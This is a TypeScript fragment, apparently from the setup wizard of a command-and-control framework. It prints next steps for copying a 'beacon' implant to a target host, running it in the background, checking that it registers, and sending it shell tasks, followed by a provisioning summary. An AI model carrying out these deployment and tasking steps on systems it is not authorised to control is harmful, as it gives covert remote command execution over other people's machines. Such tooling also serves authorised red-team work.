  const binaryPath = state.binaryPath ?? "./beacon";
  const steps = [
    `octoctl start                           ${DIM}# import enrollment and publish recovery${RESET}`,
    `scp ${binaryPath} target:/tmp/beacon`,
    ...(state.codespaceName
      ? [
          `provision SVC_CODESPACES_GITHUB_TOKEN on target ${DIM}# protected runtime secret; SSH mode only${RESET}`,
        ]
      : []),
    `ssh target 'env -u SVC_GITHUB_TOKEN \\`,
    `  -u SVC_APP_PRIVATE_KEY /tmp/beacon &' ${DIM}# no static GitHub/App credential${RESET}`,
    `octoctl beacons                         ${DIM}# verify registration (~60s)${RESET}`,
    `octoctl task <id> --kind shell --cmd id ${DIM}# first task${RESET}`,
    `octoctl results <id>                    ${DIM}# read output${RESET}`,
  ];

  p.note(steps.join("\n"), "Next steps");

  p.note(
    `Beacon ID:       ${state.beaconId}\n` +
    `Controller env:  ${state.envPath ?? "(not written)"}\n` +
    `Enrollment dir:  ${state.enrollmentDir ?? "(build later)"}\n` +
    `Operator API:    ${maskToken(state.operatorApiToken)}\n` +
    `Dashboard:       http://localhost:5173\n\n` +
    `HTTP and gRPC listeners remain disabled by default. To use the\n` +
    `dashboard API or direct channels, enable the listener in the\n` +
    `controller .env and provision TLS before exposing it.`,
    "Provisioning summary"
  );
}
